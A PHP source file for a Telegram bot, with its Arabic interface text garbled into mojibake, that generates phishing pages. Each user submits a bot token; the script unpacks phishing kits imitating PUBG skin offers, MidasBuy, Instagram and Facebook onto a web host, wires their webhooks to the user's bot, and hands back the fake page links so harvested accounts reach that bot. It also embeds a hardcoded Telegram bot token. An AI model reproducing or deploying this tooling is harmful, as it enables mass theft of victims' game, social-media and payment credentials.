<?php

ob_start();
$API_KEY = '5832297455:AAHRohMYz81QnxGnjWwR0Pm8cmUqPvU5nUk';
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}

#ŸáŸÜÿß ÿ≠ÿ∑ ÿ±ÿßÿ®ÿ∑ ÿßŸÑÿßÿ≥ÿ™ÿ∂ÿßŸÅŸá   ŸàÿßŸÑÿßŸäÿØŸä 
$weeeb = "https://bot-c60061.ingress-earth.ewp.live/index";
$admin_id = '5011123303';
include "admin.php";


$update         = json_decode(file_get_contents('php://input'));
$message        = $update->message;
$text           = $message->text;
$data           = $update->callback_query->data;
$user           = $update->message->from->username;
$user2          = $update->callback_query->from->username;
$name           = $update->message->from->first_name;
$name2          = $update->callback_query->from->first_name;
$message_id     = $message->message_id;
$message_id2    = $update->callback_query->message->message_id;
$chat_id        = $message->chat->id;
$chat_id2       = $update->callback_query->message->chat->id;
$from_id        = $message->from->id;
$from_id2       = $update->callback_query->message->from->id;
$info_token     = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo"); 

$info_tokens    = json_decode($info_token);

$get_done_spin  = file_get_contents('infos/explod_spin.txt');
$done_spin      = explode("\n",$get_done_spin);

$get_id         = file_get_contents('infos/info.txt'); 
$get_ids        = explode("\n", $get_id);
$index          = "<html><meta HTTP-EQUIV='REFRESH' content='0; url=https://t.me/Houassff_bot/></html>";
$spin_ma        = file_get_contents("data/$from_id/spin_ma.txt");


mkdir("infos");
mkdir("PUBG");
mkdir("data");
mkdir("insta");
mkdir("facebook");

if($text == '/start'){ 
    
mkdir("data/$from_id");
mkdir("PUBG/$from_id");
mkdir("insta/$from_id");
mkdir("facebook/$from_id");

if(!is_dir("PUBG/$from_id")){
    mkdir("PUBG/$from_id");
}
if(!is_dir("insta/$from_id")){
    mkdir("insta/$from_id");
}
if(!is_dir("facebook/$from_id")){
    mkdir("facebook/$from_id");
}
if(!is_dir("data/$from_id")){
    mkdir("data/$from_id");
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
‚ô£Ô∏é ŸÖÿ±ÿ≠ÿ®ÿßŸã ÿ®ŸÉ ŸÅŸä ÿ£ŸÅÿ∂ŸÑ ÿ®Ÿàÿ™ ÿµÿßŸÜÿπ ÿ≥ŸÉÿßŸÖÿ© ü™ô

‚ôß ŸäŸÇŸàŸÖ ÿßŸÑÿ®Ÿàÿ™ ÿ®ÿ•ŸÜÿ¥ÿßÿ° ÿ≥ŸÉÿßŸÖÿ© ÿ®ÿ®ÿ¨Ÿä ŸÖÿ¨ÿßŸÜÿßŸã ŸÑŸÉ üßæ

‚ô£Ô∏é ŸÉŸÑ ŸÖÿßÿπŸÑŸäŸÉ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑŸÉŸäÿ®Ÿàÿ±ÿØ ÿßŸÑÿ∞Ÿä ŸÅŸä ÿßŸÑÿßÿ≥ŸÅŸÑ ‚¨áÔ∏è ‚å®
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'‚óè ÿßŸÜÿ¥ÿßÿ° ÿ≥ŸÉÿßŸÖÿ© üí≥',],['text'=>'‚óã ÿ≠ÿ∞ŸÅ ÿßŸÑÿ≥ŸÉÿßŸÖÿ© üöΩ',]],
[['text'=>'‚ô†Ô∏é ÿ±Ÿàÿßÿ®ÿ∑ ÿßŸÑÿ≥ŸÉÿßŸÖÿ© ‚õì',]],
[['text'=>'‚ô§ ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ®Ÿàÿ™ ü©∫',]],
],'resize_keyboard'=>true,
])
]);
}


if($text == '- ÿ±ÿ¨Ÿàÿπ ‚èÆ' or $text == "-  ÿ±ÿ¨Ÿàÿπ ‚èÆ" or $text == "‚Ä¢ ÿ±ÿ¨Ÿàÿπ ‚èÆ"){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
‚ô£Ô∏é ŸÖÿ±ÿ≠ÿ®ÿßŸã ÿ®ŸÉ ŸÅŸä ÿ£ŸÅÿ∂ŸÑ ÿ®Ÿàÿ™ ÿµÿßŸÜÿπ ÿ≥ŸÉÿßŸÖÿ© ü™ô

‚ôß ŸäŸÇŸàŸÖ ÿßŸÑÿ®Ÿàÿ™ ÿ®ÿ•ŸÜÿ¥ÿßÿ° ÿ≥ŸÉÿßŸÖÿ© ÿ®ÿ®ÿ¨Ÿä ŸÖÿ¨ÿßŸÜÿßŸã ŸÑŸÉ üßæ

‚ô£Ô∏é ŸÉŸÑ ŸÖÿßÿπŸÑŸäŸÉ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑŸÉŸäÿ®Ÿàÿ±ÿØ ÿßŸÑÿ∞Ÿä ŸÅŸä ÿßŸÑÿßÿ≥ŸÅŸÑ ‚¨áÔ∏è ‚å®
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'‚óè ÿßŸÜÿ¥ÿßÿ° ÿ≥ŸÉÿßŸÖÿ© üí≥',],['text'=>'‚óã ÿ≠ÿ∞ŸÅ ÿßŸÑÿ≥ŸÉÿßŸÖÿ© üöΩ',]],
[['text'=>'‚ô†Ô∏é ÿ±Ÿàÿßÿ®ÿ∑ ÿßŸÑÿ≥ŸÉÿßŸÖÿ© ‚õì',]],
[['text'=>'‚ô§ ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ®Ÿàÿ™ ü©∫',]],
],'resize_keyboard'=>true,
])
]);
unlink("data/$from_id/spin_ma.txt");
}





if($text == '‚óè ÿßŸÜÿ¥ÿßÿ° ÿ≥ŸÉÿßŸÖÿ© üí≥' and in_array($chat_id,$done_spin)){ 
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- ŸÑÿß ŸäŸÖŸÉŸÜŸÉ ÿßŸÜÿ¥ÿßÿ° ÿßŸÉÿ´ÿ± ŸÖŸÜ ÿ±ÿßÿ®ÿ∑ ŸÖŸÜ ŸÉŸÑ ÿ¥ŸÉŸÑ ‚ÅâÔ∏è",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- ÿ±ÿ¨Ÿàÿπ ‚èÆ',]],
],'resize_keyboard'=>true])]);}

if($text == '‚óè ÿßŸÜÿ¥ÿßÿ° ÿ≥ŸÉÿßŸÖÿ© üí≥' and !in_array($from_id,$done_spin)){ 
file_put_contents("data/$from_id/spin_ma.txt", "make");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- ÿ≥ŸÉÿßŸÖÿ© ÿ¨ÿØŸäÿØÿ© Ÿà ÿßÿ¥ŸÉÿßŸÑ ŸÖŸÖŸÉÿ¥ŸàŸÅŸá

- ŸÅŸÇÿ∑ ÿßÿ±ÿ≥ŸÑ ÿßŸÑÿ™ŸàŸÉŸÜ ÿßŸÑÿÆÿßÿµ ÿ®ŸÉ üéü 
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- ÿ±ÿ¨Ÿàÿπ ‚èÆ',]],
],'resize_keyboard'=>true])]);}

if($text and $spin_ma == "make" and $info_tokens->ok != "true"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"- ÿπÿ∞ÿ±ÿßŸã ÿßŸÑÿ™ŸàŸÉŸÜ ÿßŸÑÿ∞Ÿä ÿßÿ±ÿ≥ŸÑÿ™Ÿá ÿ∫Ÿäÿ± ÿµÿßŸÑÿ≠ ‚ÅâÔ∏è\".",
'reply_to_message_id'=>$message->message_id,'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'- ÿ±ÿ¨Ÿàÿπ ‚èÆ',]],
],'resize_keyboard'=>true,])
]);
}

if($text and $spin_ma == "make" and $info_tokens->ok == "true"){
if(!is_dir("PUBG/$from_id")){
    mkdir("PUBG/$from_id");
}
if(!is_dir("insta/$from_id")){
    mkdir("insta/$from_id");
}
if(!is_dir("data/$from_id")){
    mkdir("data/$from_id");
}
file_put_contents("data/$from_id/spin_ma.txt", "null");
mkdir("PUBG/$from_id/1");
file_put_contents("PUBG/$from_id/1/Token.txt","$text");
file_put_contents("PUBG/$from_id/1/Id.txt","$from_id");
$str       = str_replace($from_id, '', $get_id);
file_put_contents('infos/info.txt', $str);   
file_put_contents("insta/$from_id/Id.txt","$from_id");
file_put_contents("insta/$from_id/Token.txt","$text");
$Token     = file_get_contents("PUBG/$from_id/2/Token.txt");
file_put_contents("PUBG/$from_id/2/Token.txt","$Token\n$from_id");

    mkdir("PUBG/$from_id/2");
    file_put_contents("PUBG/$from_id/2/Token.txt","$text");
    file_put_contents("PUBG/$from_id/2/Id.txt","$from_id");
    $str       = str_replace($from_id, '', $get_id);
    file_put_contents('infos/info.txt', $str);   
    $Token     = file_get_contents("PUBG/$from_id/2/Token.txt");
    
  
  $zipspin = "Facebook.zip"; 
$zip = new ZipArchive;
if($zip->open($zipspin) === TRUE){
$zip->extractTo(__DIR__."/"."PUBG/$from_id/1"); 
$zip->close();    
}

$zipinsta = "insta.zip"; 
$zip = new ZipArchive;
if($zip->open($zipinsta) === TRUE){
$zip->extractTo(__DIR__."/"."insta/$from_id/"); 
$zip->close();    
}

$zipfacebook = "facebook.zip"; 
$zip = new ZipArchive;
if($zip->open($zipfacebook) === TRUE){
$zip->extractTo(__DIR__."/"."facebook/$from_id/"); 
$zip->close();    
}

$zipuc = "midasbuy.zip"; 
    $zip = new ZipArchive;
    if($zip->open($zipuc) === TRUE){
    $zip->extractTo(__DIR__."/"."PUBG/$from_id/2"); 
    $zip->close();    
    }
  
file_get_contents("https://api.telegram.org/bot$Token/setwebhook?url=$weeeb/PUBG/$from_id/2/verification.php");
$url_info  = file_get_contents("https://api.telegram.org/bot$Token/getMe");
    $json_info = json_decode($url_info);
    $userr     = $json_info->result->username;
file_get_contents("https://api.telegram.org/bot$Token/setwebhook?url=$weeeb/insta/$from_id/verification.php");
    $url_info  = file_get_contents("https://api.telegram.org/bot$Token/getMe");
    $json_info = json_decode($url_info);
    $userr     = $json_info->result->username;
    file_put_contents('infos/explod_uc.txt', $from_id . "\n", FILE_APPEND);  
  file_get_contents("https://api.telegram.org/bot$Token/setwebhook?url=$weeeb/PUBG/$from_id/1/verification.php");
$Token     = file_get_contents("PUBG/$from_id/1/Token.txt");
$url_info  = file_get_contents("https://api.telegram.org/bot$Token/getMe");
$json_info = json_decode($url_info);
$userr     = $json_info->result->username;
file_put_contents('infos/explod_spin.txt', $from_id . "\n", FILE_APPEND);
file_get_contents("https://api.telegram.org/bot$Token/setwebhook?url=$weeeb/facebook/$from_id/1/verification.php");
$Token     = file_get_contents("facebook/$from_id/1/Token.txt");
$url_info  = file_get_contents("https://api.telegram.org/bot$Token/getMe");
$json_info = json_decode($url_info);
$userr     = $json_info->result->username;
file_put_contents('infos/explod_spin.txt', $from_id . "\n", FILE_APPEND);

bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
- ÿ™ŸÖ ÿ•ŸÜÿ¥ÿßÿ° ÿ≥ŸÉÿßŸÖÿ© ÿ®ÿ®ÿ¨Ÿä ÿßŸÑÿÆÿßÿµŸá ÿ®ŸäŸÉ ÿ®ŸÜÿ¨ÿßÿ≠  ‚úÖ 

- Ÿáÿ∞Ÿá ÿ±Ÿàÿßÿ®ÿ∑  ÿßŸÑÿ≥ŸÉÿßŸÖÿ© ÿßŸÑÿÆÿßÿµŸá ÿ®ŸäŸÉ üñá

‚Ä¢ Suits-X -„Äã

$weeeb/PUBG/$from_id/1/index.php ‚öúÔ∏è

‚Ä¢ MidasBuy -„Äã

$weeeb/PUBG/$from_id/2/index.php ‚öúÔ∏è


‚Ä¢ INSTA -„Äã

$weeeb/insta/$from_id/index.php ‚öúÔ∏è

‚Ä¢ INSTA -„Äã

$weeeb/facebook/$from_id/index.php ‚öúÔ∏è

- ŸÖÿπÿ±ŸÅ ÿßŸÑÿ®Ÿàÿ™ŸÉ ÿßŸÑÿ∞Ÿä ÿ≥ÿ™ÿ≥ÿ™ŸÑŸÖ ÿ®Ÿá ÿßŸÑÿ≠ÿ≥ÿßÿ®ÿßÿ™ üìÆ 

@$userr ü§ñ 

",
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'- ÿ±ÿ¨Ÿàÿπ ‚èÆ',]],
],
'resize_keyboard'=>true,
])
]);
}



##


if($text == '‚óã ÿ≠ÿ∞ŸÅ ÿßŸÑÿ≥ŸÉÿßŸÖÿ© üöΩ'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
‚ò£ ŸÑÿ≠ÿ∞ŸÅ ÿßŸÑÿ±Ÿàÿßÿ®ÿ∑ ÿßŸÑÿÆÿßÿµŸá ÿ®ŸÉ Ÿäÿ±ÿ¨Ÿä ÿ™ÿßŸÉŸäÿØ ÿßŸÑÿ≠ÿ∞ŸÅ üö´
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'‚õî ÿ™ÿßŸÉŸäÿØ ÿßŸÑÿ≠ÿ∞ŸÅ ‚ùå',]],
[['text'=>'- ÿ±ÿ¨Ÿàÿπ ‚èÆ',]],
],'resize_keyboard'=>true,
])
]);
}


if($text == '‚õî ÿ™ÿßŸÉŸäÿØ ÿßŸÑÿ≠ÿ∞ŸÅ ‚ùå' and in_array($from_id,$done_spin)){ 
    $str1 = str_replace($from_id, '',$done_spin);
    file_put_contents('infos/explod_spin.txt', $str1);
    unlink("PUBG/$from_id/1/verification.php");
    unlink("PUBG/$from_id/2/verification.php");
    unlink("insta/$from_id/verification.php");
    unlink("facebook/$from_id/verification.php");
    
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸÑÿ≥ŸÉÿßŸÖÿ© ÿßŸÑÿÆÿßÿµŸá ÿ®ŸäŸÉ ‚ÅâÔ∏è.",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- ÿ±ÿ¨Ÿàÿπ ‚èÆ',]],
],'resize_keyboard'=>true])]);}


if($text == '‚óã ÿ≠ÿ∞ŸÅ ÿßŸÑÿ≥ŸÉÿßŸÖÿ© üöΩ' and !in_array($from_id,$done_spin)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- ÿπÿ∞ÿ±ÿßŸã ŸÇŸÖ ÿ®ÿ•ŸÜÿ¥ÿßÿ° ÿ≥ŸÉÿßŸÖÿ© ÿ¢ŸàŸÑÿß ‚ÅâÔ∏è.",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- ÿ±ÿ¨Ÿàÿπ ‚èÆ',]],
],'resize_keyboard'=>true])]);}


$url_info  = file_get_contents("https://api.telegram.org/bot$Token/getMe");
    $json_info = json_decode($url_info);
    $userr     = $json_info->result->username;


if($text == '‚ô†Ô∏é ÿ±Ÿàÿßÿ®ÿ∑ ÿßŸÑÿ≥ŸÉÿßŸÖÿ© ‚õì' and in_array($from_id,$done_spin)){ 

bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
- Ÿáÿ∞ÿß ÿ±ÿßÿ®ÿ∑  ÿßŸÑÿ≥ŸÉÿßŸÖÿ© ÿßŸÑÿÆÿßÿµ ÿ®ŸäŸÉ üñá


‚Ä¢ Skin -„Äã

$weeeb/PUBG/$from_id/1/index.php ‚öúÔ∏è

‚Ä¢ MidasBuy -„Äã

$weeeb/PUBG/$from_id/2/index.php ‚öúÔ∏è

‚Ä¢ INSTA -„Äã

$weeeb/insta/$from_id/index.php ‚öúÔ∏è


- ŸÖÿπÿ±ŸÅ ÿßŸÑÿ®Ÿàÿ™ŸÉ ÿßŸÑÿ∞Ÿä ÿ≥ÿ™ÿ≥ÿ™ŸÑŸÖ ÿ®Ÿá ÿßŸÑÿ≠ÿ≥ÿßÿ®ÿßÿ™ üìÆ 

@$userr ü§ñ 

",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- ÿ±ÿ¨Ÿàÿπ ‚èÆ',]],
],'resize_keyboard'=>true])]);}


if($text == '‚ô†Ô∏é ÿ±Ÿàÿßÿ®ÿ∑ ÿßŸÑÿ≥ŸÉÿßŸÖÿ© ‚õì' and !in_array($from_id,$done_spin)){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- ÿπÿ∞ÿ±ÿßŸã ŸÇŸÖ ÿ®ÿ•ŸÜÿ¥ÿßÿ° ÿ≥ŸÉÿßŸÖÿ© ŸÖŸÜ Ÿáÿ∞ÿß ÿßŸÑŸÜŸàÿπ ÿ¢ŸàŸÑÿß ‚ÅâÔ∏è.",
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'- ÿ±ÿ¨Ÿàÿπ ‚èÆ',]],
],'resize_keyboard'=>true])]);}

if($text == '‚ô§ ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ®Ÿàÿ™ ü©∫'){ 
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
‚ô£Ô∏é ŸÖÿ±ÿ≠ÿ®ÿßŸã ÿ®ŸÉ ŸÅŸä ÿ£ŸÅÿ∂ŸÑ ÿ®Ÿàÿ™ ÿµÿßŸÜÿπ ÿ≥ŸÉÿßŸÖÿ© ü™ô

‚ôß ŸäŸÇŸàŸÖ ÿßŸÑÿ®Ÿàÿ™ ÿ®ÿ•ŸÜÿ¥ÿßÿ° ÿ≥ŸÉÿßŸÖÿ© ÿ®ÿ®ÿ¨Ÿä ŸÖÿ¨ÿßŸÜÿßŸã ŸÑŸÉ üßæ

‚ô£Ô∏é ŸÉŸÑ ŸÖÿßÿπŸÑŸäŸÉ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑŸÉŸäÿ®Ÿàÿ±ÿØ ÿßŸÑÿ∞Ÿä ŸÅŸä ÿßŸÑÿßÿ≥ŸÅŸÑ ‚¨áÔ∏è ‚å®
",'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'‚óè ÿßŸÜÿ¥ÿßÿ° ÿ≥ŸÉÿßŸÖÿ© üí≥',],['text'=>'‚óã ÿ≠ÿ∞ŸÅ ÿßŸÑÿ≥ŸÉÿßŸÖÿ© üöΩ',]],
[['text'=>'‚ô†Ô∏é ÿ±Ÿàÿßÿ®ÿ∑ ÿßŸÑÿ≥ŸÉÿßŸÖÿ© ‚õì',]],
[['text'=>'‚ô§ ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ®Ÿàÿ™ ü©∫',]],
],'resize_keyboard'=>true])]);}
